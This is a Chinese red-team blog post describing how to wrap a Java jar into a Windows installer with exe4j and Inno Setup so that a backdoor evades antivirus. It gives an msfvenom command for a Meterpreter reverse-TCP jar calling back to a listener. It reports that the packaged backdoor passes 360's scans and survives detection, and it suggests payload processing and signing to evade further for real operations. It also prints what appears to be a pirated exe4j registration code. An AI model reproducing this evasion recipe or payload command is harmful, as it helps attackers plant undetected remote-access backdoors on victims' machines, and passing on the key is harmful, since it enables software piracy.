---
title: 从Jar到Exe
date: 2022-07-05T13:56:26+08:00
lastmod: 2022-07-05T13:56:26+08:00
author: rebootORZ
avatar: /me/gl.jpg
#  authorlink: https://author.site
# cover: /img/cover.jpg
#  images:
#   - /img/cover.jpg
categories:
  - category1
tags:
  - 红队技术
nolastmod: true
draft: true
---

## 前言

本文章的目的在于探索极端环境下，使用java编写木马代替常见Go、C++、ps等后门的可能性，及免杀效果的探索。



## 环境

- Macbook Catalina 10.15.5
- Java 1.8.0_211
- IDeaJ 2021.01

* 一个正常的jar文件

* exe4j

  一个将jar转换成exe的工具，链接：https://exe4j.apponic.com/ 注册码：L-g782dn2d-1f1yqxx1rv1sqd

* inno

  一个将依赖和exe一起打成一个安装程序的工具， 链接：https://jrsoftware.org/isdl.php



## 实践

### Jar文件准备

​	简单写一个打印程序：

enjoy.class

```java
public class enjoy {

    public static void main(String[] args) {
        System.out.println("rebootORZ...");
    }
}
```

![image-20210830103156308](/imgs/image-20210830103156308.png)

打包成jar后的效果：

![image-20210830102005675](/imgs/image-20210830102005675.png)



### 第一阶段打包

安装好exe4j如下：

![image-20210830102234683](/imgs/image-20210830102234683.png)

直接 Next -> Project type -> "JAR in EXE" mode ->Next

![image-20210830102349561](/imgs/image-20210830102349561.png)

接着输入生成的应用名称和输出路径：

![image-20210830102527332](/imgs/image-20210830102527332.png)

选择运行方式，根据实际情况，这里选择命令行的形式，下面有个配置图标的，这里不做设置：

![image-20210830103008233](/imgs/image-20210830103008233.png)

下面需要设置一下兼容性Advanced Options

![image-20210830103043197](/imgs/image-20210830103043197.png)

钩上即可

![image-20210830102901391](/imgs/image-20210830102901391.png)

一路Next，然后到下面这步：

在VM Parameters处填上：-Dfile.encoding=utf-8

![image-20210830103628878](/imgs/image-20210830103628878.png)

然后点击右边的绿色加号添加jar包：

![image-20210830103702068](/imgs/image-20210830103702068.png)

然后选择主类：

![image-20210830103746124](/imgs/image-20210830103746124.png)

下一步填写系统jdk版本，和配置jre:

![image-20210830103929584](/imgs/image-20210830103929584.png)

在输出目录下创建jre文件夹，并将jre的文件全部拷贝到该目录下：

<img src="/imgs/image-20210831104838307.png" alt="image-20210831104838307" style="zoom:50%;" />

选择jre

![image-20210831105102099](/imgs/image-20210831105102099.png)

这一步的作用是让exe文件能够知道jre在哪里，在后面第二步打包的时候能够自己去这个路径找。

![image-20210830104526117](/imgs/image-20210830104526117.png)

后面就一直点击Next直到完成即可：

![image-20210830105234001](/imgs/image-20210830105234001.png)

这时候我们指定的输出目录下面会生成一个exe文件，此时该文件不是最终效果，因为前面指定的时候还只是指定了路径，但还没有将依赖打包到一起。

![image-20210830105309167](/imgs/image-20210830105309167.png)



### 第二阶段打包

这个阶段需要让exe和指定的jre打包成一体，需要用到inno

File -> Create

输入应用名字，其他随意

![image-20210830111717944](/imgs/image-20210830111717944.png)

添加文件：

![image-20210830111822640](/imgs/image-20210830111822640.png)

一路Next，选择语言：

![image-20210830111922558](/imgs/image-20210830111922558.png)

接着设置输出路径和文件名：

![image-20210830112009853](/imgs/image-20210830112009853.png)

![image-20210830112106557](/imgs/image-20210830112106557.png)

这里提示是否马上进行编译，选择否，因为我们还需要进行一些修改：

![image-20210830112148848](/imgs/image-20210830112148848.png)

在下图位置另起一行插入红框中的内容：

![image-20210830112430064](/imgs/image-20210830112430064.png)

删掉下面这行：

![image-20210831111945603](/imgs/image-20210831111945603.png)

修改内容，按这个格式：

```
Source: "前面创建的JRE路径\*"; DestDir: "{app}\{#MyJreName}"; Flags: ignoreversion recursesubdirs createallsubdirs
```

![image-20210831110219519](/imgs/image-20210831110219519.png)

点击绿色按钮进行编译，提示是否保存，根据实际情况选择即可：

![image-20210831110653975](/imgs/image-20210831110653975.png)

等最终下面的绿色进度条走完即可：

![image-20210831110718372](/imgs/image-20210831110718372.png)

运行结束后桌面生成了一个安装文件，文件名就是我们指定的文件名，程序会帮我们运行这个程序，安装即可

![image-20210830114004629](/imgs/image-20210830114004629.png)

运行效果如图：

![image-20210830114435573](/imgs/image-20210830114435573.png)

大小如下：

安装包 - 48.9M

<img src="/imgs/image-20210830114508448.png" alt="image-20210830114508448" style="zoom:50%;" />



安装后 - 791M

<img src="/imgs/image-20210831111059325.png" alt="image-20210831111059325" style="zoom:50%;" />

由于需要将jre环境也打包进去，所以导致打包后的程序编的异常的大，所以一般不会用到这种方式，这个只能适用于极端环境。



### 免杀测试

生成默认的msf jar后门

```
msfvenom -p java/meterpreter/reverse_tcp LHOST=172.16.81.1 LPORT=4444 x >~/Desktop/TestJar.jar
```

监听：

<img src="/imgs/image-20210830160903428.png" alt="image-20210830160903428" style="zoom:50%;" />

不打包，直接运行TestJar.jar会立马报毒：

<img src="file:///Users/rebootorz/Documents/Markdown%E7%AC%94%E8%AE%B0/%E4%BB%8EJar%E5%88%B0Exe/imgs/image-20210830171638129.png?lastModify=1630315654" alt="image-20210830171638129" style="zoom:50%;" />

按照上面的方法对TestJar.jar进行打包，在没有杀软和java环境的机器上安装并运行，可以成功上线：

![image-20210830173105652](/imgs/image-20210830173105652.png)

在安装了360的机器上测试：

安装包查杀，未发现风险：

<img src="/imgs/image-20210830162146952.png" alt="image-20210830162146952" style="zoom:50%;" />

安装后的文件夹，未发现风险：
<img src="/imgs/image-20210830162343110.png" alt="image-20210830162343110" style="zoom: 50%;" />

运行安装后的程序：

运行后不会马上出发告警

![image-20210830164405416](/imgs/image-20210830164405416.png)

尝试执行命令后出发告警了：

<img src="/imgs/image-20210830164553491.png" alt="image-20210830164553491" style="zoom: 50%;" />

<img src="/imgs/image-20210830165843925.png" alt="image-20210830165843925" style="zoom:50%;" />

可以看到，提示的是已经成功删除病毒文件(注意，这里删除的文件是.class文件-----java的类文件)，但我们回到我们的meterpreter，发现并没有掉线，且能够正常执行所有命令，后续不会再有告警：

<img src="/imgs/image-20210830170035943.png" alt="image-20210830170035943" style="zoom: 50%;" />

经过主动检测，除了普通的系统优化建议外，无法查杀出后门：

<img src="/imgs/image-20210830170517385.png" alt="image-20210830170517385" style="zoom:50%;" />

通过上面测试，说明即使恶意文件被删除了，但是我们的会话还是在线，且不会再触发告警或被主动检测出风险，说明我们的后门的恶意类已经被加载进了内存。

从进程上看，只能看到有个java程序在运行：

<img src="/imgs/image-20210830170957777.png" alt="image-20210830170957777" style="zoom:50%;" />

如果杀软开启针对内存检测的功能则免杀效果会失效，例如开启360的网购模式：

提示进程java.exe存在问题了

<img src="/imgs/image-20210831113234486.png" alt="image-20210831113234486"  />



## 结论

### 优点

1.使用msf直接生成，为进行任何处理的后门也能有效免杀

2.运行后，即使被查杀一般也只是杀了恶意类文件payload.class，后台还会继续运行一个java进程，一般的方式看不出来这个异常。



### 不足之处

1.文件较大，安装前40M+，安装后700M左右

2.需要安装操作，所以就需要是能够远程桌面进行操作。

3.免杀效果不完全，还是会触发告警。



这个免杀方式只能说是一种思路，真正在实战中是否适用，还是得根据实际情况来判断。如果对payload进行处理、程序签名等，可以再提升一些免杀效果。



